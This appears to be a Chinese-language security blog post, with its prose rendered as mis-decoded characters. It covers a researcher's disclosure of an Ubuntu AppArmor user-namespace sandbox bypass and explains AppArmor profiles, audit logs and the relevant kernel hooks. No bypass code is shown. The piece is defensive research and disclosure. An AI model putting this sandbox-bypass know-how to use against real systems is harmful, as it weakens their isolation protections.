&lt;p&gt;æœ€çµ‚ ZDI åœ¨ 4 æœˆ 27 æ—¥å¯©æŸ¥äº†æˆ‘çš„å›å ±ï¼Œä½†ä»–å€‘å›è¦†èªªä»–å€‘å°é€™ç¨®é¡å‹çš„å•é¡Œæ²’èˆˆè¶£ï¼Œä¸¦æ‹’çµ•å¾ŒçºŒçš„è™•ç†ã€‚æ²’æƒ³åˆ°æˆ‘æœæ€æš®æƒ³ç­‰äº†å…©å€‹å¤šæœˆï¼Œæ›ä¾†çš„ç«Ÿç„¶æ˜¯é€™ç¨®å›è¦†ã€‚é›–ç„¶éŒ¯æ„•ï¼Œä½†æˆ‘é‚„æ˜¯é¦¬ä¸Šæ”¹å›å ±çµ¦ Ubuntu å®‰å…¨åœ˜éšŠï¼Œç•¢ç«Ÿé€™å€‹ç¹éæ‰‹æ³•å¯èƒ½é‚„æ²’è¢«æ­éœ²ã€‚çµæœä¸åˆ°ä¸€å¤©ï¼Œæˆ‘å°±æ”¶åˆ°å…¶ä¸­ä¸€ä½æ²™ç›’æ©Ÿåˆ¶çš„ç¶­è­·è€… John çš„å›è¦†ã€‚ä»–è¡¨ç¤ºæœƒç«‹å³ç¢ºèªé€™å€‹å•é¡Œï¼Œä¸¦åœ¨å¾ŒçºŒé€šçŸ¥æˆ‘æ›´æ–°çš„ç‹€æ³ã€‚é€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å›å ±å®‰å…¨æ¼æ´çµ¦ Ubuntuï¼Œä»–å€‘ç©æ¥µçš„è™•ç†æ…‹åº¦å’Œå‹å–„çš„æºé€šæ–¹å¼è®“æ•´å€‹éç¨‹éå¸¸é †åˆ©ï¼Œèˆ‡ä»–å€‘åˆä½œçš„æ„Ÿè¦ºéå¸¸æ„‰å¿«ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ç¶“éäº†å°‡è¿‘ä¸€å€‹æœˆçš„å¯©æŸ¥èˆ‡è¨è«–ï¼ŒUbuntu å®‰å…¨åœ˜éšŠæœ€å¾Œåˆ¤å®šæˆ‘å›å ±çš„å•é¡Œï¼Œæ˜¯å…ˆå‰ Qualys Team ç™¼ç¾çš„ç¹éæ‰‹æ³•çš„è®Šç¨®ã€‚é€™å€‹è®Šç¨®æ‰‹æ³•éœ€è¦åœ¨ç‰¹å®šæ ¸å¿ƒåƒæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; è¢«é—œé–‰çš„æƒ…æ³ä¸‹æ‰æœƒç”Ÿæ•ˆã€‚ä¸éé€™å€‹åƒæ•¸å¾ Ubuntu 25.04 é–‹å§‹å°±é è¨­å•Ÿç”¨äº†ï¼Œå› æ­¤æ–°ç‰ˆç³»çµ±ä¸å—å½±éŸ¿ã€‚è‡³æ–¼èˆŠç‰ˆæœ¬çš„ Ubuntuï¼Œå®˜æ–¹å…ˆå‰æ›¾ç™¼å¸ƒé&lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;èªªæ˜æ–‡ç« &lt;/a&gt;ï¼Œæ•™ä½¿ç”¨è€…å¦‚ä½•æ‰‹å‹•å•Ÿç”¨é€™å€‹åƒæ•¸ï¼Œé¿å…è¢«é¡ä¼¼ç¹éæ‰‹æ³•å½±éŸ¿ã€‚&lt;/p&gt;

&lt;p&gt;é€™ç¯‡æ–‡ç« ç´€éŒ„äº†æˆ‘æ‰¾åˆ°ç¹éæ‰‹æ³•çš„æ–¹å¼ã€æŠ€è¡“ç´°ç¯€åˆ†æä»¥åŠå›å ±çš„éç¨‹ã€‚é›–ç„¶ Qualys Team çš„æ–‡ç« å·²ç¶“æ¶µè“‹äº†é€™å€‹æ‰‹æ³•çš„æ ¸å¿ƒæ¦‚å¿µï¼Œä½†æˆ‘èªç‚ºé€™ç¯‡æ–‡ç« ä»æœ‰ä¸€å®šçš„åƒ¹å€¼ï¼Œå› ç‚ºæˆ‘å€‘çš„åˆ†æåˆ‡å…¥é»ä¸åŒï¼šä»–å€‘æ˜¯å¾ä½¿ç”¨è€…ç©ºé–“çš„æ‡‰ç”¨å±¤é¢é–‹å§‹åˆ†æï¼Œè€Œæˆ‘æ˜¯å¾æ ¸å¿ƒå‡ºç™¼ä¾†ç†è§£æ•´å€‹ç¹éçš„åŸç†ã€‚å¸Œæœ›èƒ½å°å„ä½æœ‰å¹«åŠ©ï¼&lt;/p&gt;

&lt;h2 id=&quot;2-apparmor-101&quot;&gt;2. AppArmor 101&lt;/h2&gt;

&lt;h3 id=&quot;21-overview&quot;&gt;2.1. Overview&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;AppArmorï¼ˆApplication Armorï¼‰&lt;/strong&gt; æ˜¯ä¸€ç¨® Linux å®‰å…¨æ¨¡çµ„ï¼ˆLinux Security Module, LSMï¼‰çš„å¯¦ä½œï¼Œæä¾›å¼·åˆ¶å­˜å–æ§åˆ¶ï¼ˆMACï¼‰æ©Ÿåˆ¶ï¼Œç”¨ä¾†é™åˆ¶ç¨‹å¼å°ç³»çµ±è³‡æºçš„å­˜å–ã€‚ç³»çµ±ç®¡ç†å“¡å¯ä»¥ç‚ºç‰¹å®šç¨‹å¼å®šç¾© AppArmor è¨­å®šæª”ï¼ˆprofileï¼‰ï¼Œé™åˆ¶å®ƒçš„è¡Œç‚ºèˆ‡æ¬Šé™ã€‚å¦‚æœä¸€å€‹ç¨‹å¼æ²’æœ‰å°æ‡‰çš„ AppArmor è¨­å®šæª”ï¼Œå®ƒæœƒä»¥ &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; è¨­å®šæª”&lt;/strong&gt;åŸ·è¡Œï¼Œä¹Ÿå°±æ˜¯èªª AppArmor ä¸æœƒå°å®ƒæ–½åŠ ä»»ä½•é™åˆ¶ã€‚&lt;/p&gt;

&lt;p&gt;æ¯å€‹ AppArmor è¨­å®šæª”éƒ½é‡å°ç‰¹å®šåŸ·è¡Œæª”ï¼Œå®šç¾©å…¶å­˜å–æ§åˆ¶è¦å‰‡ï¼ŒåŒ…å«å­˜å–çš„æª”æ¡ˆã€ç³»çµ±èƒ½åŠ›ï¼ˆcapabilitiesï¼‰ä»¥åŠç¶²è·¯æ¬Šé™ã€‚å•Ÿç”¨çš„è¨­å®šæª”å¯ä»¥é‹ä½œæ–¼å…©ç¨®æ¨¡å¼ä¹‹ä¸€ï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å¼·åˆ¶æ¨¡å¼ï¼ˆEnforced modeï¼‰ï¼šç•¶ç¨‹å¼è¡Œç‚ºé•åè¨­å®šè¦å‰‡æ™‚ï¼Œæœƒè¢«é˜»æ“‹ä¸¦è¨˜éŒ„ä¸‹ä¾†ã€‚&lt;/li&gt;
  &lt;li&gt;å›å ±æ¨¡å¼ï¼ˆComplain modeï¼‰ï¼šé•è¦è¡Œç‚ºåƒ…æœƒè¢«è¨˜éŒ„ï¼Œä¸æœƒå¯¦éš›é˜»æ“‹ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸‹æ–¹ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipa_verify&lt;/code&gt; è¨­å®šæª”ä½œç‚ºç¯„ä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/ipa_verify&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profile ipa_verify&lt;/code&gt;ï¼šå®šç¾©äº†ä¸€å€‹åç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipa_verify&lt;/code&gt; çš„è¨­å®šæª”ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt;ï¼šé€™å€‹è¨­å®šæª”å¥—ç”¨åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt; é€™å€‹åŸ·è¡Œæª”ä¸Šï¼Œç•¶è©²åŸ·è¡Œæª”è¢«åŸ·è¡Œæ™‚ï¼Œè¨­å®šæª”æœƒè‡ªå‹•è¼‰å…¥ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags=(unconfined)&lt;/code&gt;ï¼šè¡¨ç¤ºé€™å€‹è¨­å®šæª”è™•æ–¼ unconfined ç‹€æ…‹ï¼Œä¹Ÿå°±æ˜¯é›–ç„¶è¼‰å…¥äº†è¨­å®šæª”ï¼Œä½†å¯¦éš›ä¸Šä¸æœƒé™åˆ¶è©²ç¨‹å¼çš„è¡Œç‚ºã€‚&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userns&lt;/code&gt;ï¼šå…è¨±è©²ç¨‹å¼æ“ä½œä½¿ç”¨è€…å‘½åç©ºé–“ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½¿ç”¨è€…å¯ä»¥é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; å‘½ä»¤åˆ—å‡ºç›®å‰ç³»çµ±ä¸­å·²å•Ÿç”¨çš„ AppArmor è¨­å®šæª”åŠå…¶ç‹€æ…‹ã€‚ä»¥ä¸‹æ˜¯ä¸€å€‹ JSON æ ¼å¼çš„è¼¸å‡ºç¯„ä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
    &quot;version&quot;: &quot;2&quot;,
    &quot;profiles&quot;: {
        &quot;/snap/snapd/23258/usr/lib/snapd/snap-confine&quot;: &quot;enforce&quot;,
        &quot;/usr/sbin/sssd&quot;: &quot;complain&quot;,
        &quot;Discord&quot;: &quot;unconfined&quot;
    },
    &quot;processes&quot;: {
        &quot;/usr/sbin/rsyslogd&quot;: [
            {
                &quot;profile&quot;: &quot;rsyslogd&quot;,
                &quot;pid&quot;: &quot;1176&quot;,
                &quot;status&quot;: &quot;enforce&quot;
            }
        ]
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-behavior-in-ubuntu&quot;&gt;2.2. Behavior in Ubuntu&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨è€…å¯ä»¥é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt; å‘½ä»¤ï¼Œåœ¨éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ä¸‹åŸ·è¡Œä»»æ„å‘½ä»¤ã€‚ä¸éï¼Œè‡ªå¾ Ubuntu å¼•å…¥æ–°çš„å®‰å…¨æ©Ÿåˆ¶å¾Œï¼ŒåŸ·è¡Œé€™å€‹å‘½ä»¤æœƒå‡ºç¾ &lt;strong&gt;â€œOperation not permittedâ€ï¼ˆ-EPERMï¼‰&lt;/strong&gt; éŒ¯èª¤ï¼Œè¡¨ç¤ºæ“ä½œè¢«æ‹’çµ•ã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unshare &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; /bin/bash
unshare: write failed /proc/self/uid_map: Operation not permitted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤æ™‚å¦‚æœä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; å‘½ä»¤æŸ¥çœ‹æ ¸å¿ƒæ—¥èªŒï¼Œæœƒçœ‹åˆ°èˆ‡ AppArmor äº‹ä»¶æœ‰é—œçš„æ—¥èªŒã€‚&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;dmesg
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.394909] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.573:545&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AUDIT&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;namespace&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unconfined&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;requested&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.395747] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.574:546&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DENIED&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;capable&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cap&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;capability&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21  &lt;span class=&quot;nv&quot;&gt;capname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sys_admin&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ol&gt;
  &lt;li&gt;ç¬¬ä¸€å€‹ AppArmor äº‹ä»¶ï¼šç¨½æ ¸äº‹ä»¶ï¼ˆAudit Eventï¼‰
    &lt;ul&gt;
      &lt;li&gt;é€™ç­†äº‹ä»¶ç´€éŒ„äº†åŸ·è¡Œç›¸é—œçš„ç´°ç¯€ã€‚&lt;/li&gt;
      &lt;li&gt;å…§å®¹æŒ‡å‡ºï¼ŒPID ç‚º 29466 çš„ç¨‹å¼ï¼ˆ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt;ï¼‰è©¦åœ–å»ºç«‹ä¸€å€‹ä½¿ç”¨è€…å‘½åç©ºé–“ï¼ˆ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operation=&quot;userns_create&quot;&lt;/code&gt;ï¼‰ã€‚&lt;/li&gt;
      &lt;li&gt;è©²ç¨‹å¼ç•¶ä¸‹æ˜¯ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; è¨­å®šæª”åŸ·è¡Œï¼Œä»£è¡¨å°šæœªå—åˆ°ä»»ä½•é™åˆ¶ã€‚&lt;/li&gt;
      &lt;li&gt;åœ¨é€™ç­†äº‹ä»¶ä¹‹å¾Œï¼ŒAppArmor å°‡è©²ç¨‹å¼æŒ‡æ´¾åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; é€™è¨­å®šæª”ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¬¬äºŒå€‹ AppArmor äº‹ä»¶ï¼šæ‹’çµ•äº‹ä»¶ï¼ˆDeny Eventï¼‰
    &lt;ul&gt;
      &lt;li&gt;é€™ç­†äº‹ä»¶è¡¨ç¤ºæœ‰ä¸€å€‹æ“ä½œè¢« AppArmor é˜»æ“‹ã€‚&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; è¨­å®šæª”é™åˆ¶ç¨‹å¼ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt; capabilityã€‚&lt;/li&gt;
      &lt;li&gt;è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt; å»ºç«‹ä½¿ç”¨è€…å‘½åç©ºé–“æ™‚éœ€è¦ç”¨åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt;ï¼Œå› æ­¤è¢« AppArmor é˜»æ“‹ï¼Œæœ€çµ‚å°è‡´ &lt;strong&gt;â€œOperation not permitted (-EPERM)â€&lt;/strong&gt; éŒ¯èª¤ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨ Ubuntu ä¸­ï¼Œæ‰€æœ‰çš„ AppArmor è¨­å®šæª”éƒ½æ”¾åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/&lt;/code&gt; ç›®éŒ„åº•ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /etc/apparmor.d/
total 528
drwxr-xr-x   9 root root  4096 Feb 17 10:46 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   354 Oct  2 07:24 1password
...
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   699 Oct  2 07:24 unprivileged_userns
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æª”æ¡ˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt; å®šç¾©äº† AppArmor çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; è¨­å®šæª”ã€‚ä»¥ä¸‹æ˜¯è©²æª”æ¡ˆéƒ¨åˆ†å…§å®¹çš„èªªæ˜ï¼š&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

profile unprivileged_userns {
     audit deny capability,
     audit deny change_profile,

     [...]
     allow mqueue,
     allow ptrace,
     allow userns,
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; å‘½ä»¤ä¸­çœ‹åˆ°çš„ç¬¬äºŒç­†äº‹ä»¶ï¼Œæ­£æ˜¯ç”± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audit deny capability&lt;/code&gt; è¦å‰‡æ‰€ç”¢ç”Ÿã€‚é€™æ¢è¦å‰‡æœƒé˜»æ“‹æ‰€æœ‰éœ€è¦ç‰¹å®š capabilitiesï¼ˆä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt;ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; å’Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_CHOWN&lt;/code&gt;ï¼‰çš„æ“ä½œï¼Œä¸¦è¨˜éŒ„ä»»ä½•è¢«æ‹’çµ•çš„è«‹æ±‚ã€‚&lt;/p&gt;

&lt;p&gt;æ—¢ç„¶æˆ‘å€‘å·²ç¶“ç¢ºèªåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; è¨­å®šæª”ä¸‹ï¼Œå»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“æ˜¯è¢«ç¦æ­¢çš„ï¼Œé‚£æ¥ä¸‹ä¾†æœ€é—œéµçš„å•é¡Œå°±æ˜¯ï¼š
&lt;strong&gt;ç‚ºä»€éº¼åŸæœ¬è™•æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; è¨­å®šæª”çš„ç¨‹å¼ï¼Œæœƒè‡ªå‹•è¢«è½‰æ›åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt;ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è§£ç­”é€™å€‹å•é¡Œï¼Œæˆ‘å€‘éœ€è¦æ·±å…¥äº†è§£ Ubuntu æ˜¯å¦‚ä½•ä½¿ç”¨ AppArmor ä¾†å¯¦ä½œæ²™ç›’ï¼&lt;/p&gt;

&lt;h2 id=&quot;3-investigating-ubuntu-kernel-patch&quot;&gt;3. Investigating Ubuntu Kernel Patch&lt;/h2&gt;

&lt;h3 id=&quot;31-analysis-strategy&quot;&gt;3.1. Analysis Strategy&lt;/h3&gt;

&lt;p&gt;æ¯å€‹ Linux ç™¼è¡Œç‰ˆéƒ½æœƒæ ¹æ“šè‡ªèº«éœ€æ±‚ä¿®æ”¹ Linux æ ¸å¿ƒï¼ŒUbuntu ç•¶ç„¶ä¹Ÿä¸ä¾‹å¤–ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨åˆ†æ Ubuntu çš„åŸå§‹ç¢¼æ™‚ï¼Œä¸€å…±æœƒä¸‹è¼‰å…©å€‹æª”æ¡ˆï¼šä¸€æ˜¯ Linux åŸå§‹ç¢¼çš„åŸºç¤ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;.orig.tar.gz&lt;/code&gt;ï¼‰ï¼Œå¦ä¸€å€‹å‰‡æ˜¯ Ubuntu è‡ªè¡Œç¶­è­·çš„ä¿®æ”¹å·®ç•°æª”ï¼ˆä¾‹å¦‚ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;-&amp;lt;x&amp;gt;.&amp;lt;y&amp;gt;.diff.gz&lt;/code&gt;ï¼Œå…¶ä¸­ x æ˜¯ Ubuntu çš„å…§éƒ¨ç¶­è­·ç‰ˆæœ¬è™Ÿï¼Œy å‰‡é€šå¸¸æ˜¯æ¬¡è¦ç‰ˆæœ¬æˆ–ä¿®è£œç‰ˆæœ¬ï¼‰ã€‚è‹¥è¦åˆ†æ Ubuntu çš„å®¢è£½åŒ–è¡Œç‚ºï¼Œé€šå¸¸æœƒæ­é…é€™å€‹å·®ç•°æª”ä¾†æª¢æŸ¥å¥—ç”¨å¾Œçš„æ ¸å¿ƒåŸå§‹ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä½†å°±æ‹¿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_6.11.0-18.18.diff&lt;/code&gt; é€™å€‹æª”æ¡ˆä¾†èªªï¼Œèˆ‡åŸºç¤ç‰ˆæœ¬çš„å·®ç•°è¶…é 26 è¬è¡Œã€‚æˆ‘å€‘è¦å¾ä½•ä¸‹æ‰‹ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é€éä¸€äº›ç¶“é©—æ³•å‰‡èƒ½å¤§å¹…ç¸®å°è¦åˆ†æçš„ç¯„åœï¼šåƒé€™æ¬¡ AppArmor çš„ç•°å¸¸è¡Œç‚ºï¼Œåªæœ‰åœ¨å»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“æ™‚è§¸ç™¼ï¼Œå› æ­¤åªè¦åˆ†æèˆ‡è©²æ“ä½œæœ‰é—œçš„ç¨‹å¼ç¢¼å°±å¥½ï¼›æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥å¾äº‹ä»¶ä¸­å‡ºç¾çš„é—œéµå­—ä¸‹æ‰‹ï¼Œåƒæ˜¯æœå°‹ç‰¹å®šå­—ä¸²ï¼Œå°±èƒ½å¿«é€Ÿå®šä½åˆ°å¯¦éš›è² è²¬åŸ·è¡Œè©²é‚è¼¯çš„æ ¸å¿ƒç¨‹å¼ç¢¼ã€‚&lt;/p&gt;

&lt;h3 id=&quot;32-diving-into-the-source&quot;&gt;3.2. Diving Into the Source&lt;/h3&gt;

&lt;p&gt;ç•¶ä½¿ç”¨è€…å»ºç«‹å‘½åç©ºé–“æ™‚ï¼ŒAppArmor æœƒè§¸ç™¼ hook å‡½æ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_userns_create()&lt;/code&gt; [1]ï¼Œé€™å€‹å‡½æ•¸æ˜¯ AppArmor ç‚ºå»ºç«‹å‘½åç©ºé–“æ‰€è¨­è¨ˆçš„å®‰å…¨æª¢æŸ¥é»ã€‚æ¥è‘—ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_userns_create()&lt;/code&gt; æœƒå‘¼å«å¦ä¸€å€‹å‡½æ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; [2]ï¼Œè² è²¬è™•ç†èˆ‡å‘½åç©ºé–“æ¬Šé™ç›¸é—œçš„è¨­å®šèˆ‡åˆ¤æ–·ã€‚&lt;/p&gt;

